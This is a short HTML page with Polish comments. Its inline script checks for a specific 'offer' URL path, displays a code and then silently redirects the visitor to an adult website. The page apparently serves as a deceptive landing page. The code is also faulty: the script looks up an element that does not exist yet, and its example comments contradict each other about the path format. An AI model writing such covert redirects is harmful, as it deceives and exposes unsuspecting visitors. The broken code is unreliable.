<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <script>
    // Przykład: https://twoja-strona.netlify.app/ssl/kup/ABC123
    const path = window.location.pathname; // np. "oferta/921523/?id=8n0cJg364KmE3d513AIE8O82h58jah"
    const parts = path.split('/');         // ["", "oferta", "921523", "?id=8n0cJg364KmE3d513AIE8O82h58jah"]

    if (parts.length === 4 && parts[1] === 'oferta' && parts[2] === '921523') {
      const code = parts[3];
      document.getElementById('code-box').textContent = code;

      // ✅ DODANE PRZEKIEROWANIE
      window.location.href = "http://pornhub.com/";
    } else {
      document.getElementById('code-box').textContent = "Nieprawidłowy adres URL.";
    }
  </script>
</head>
<body>
  <div id="code-box"></div>
</body>
</html>
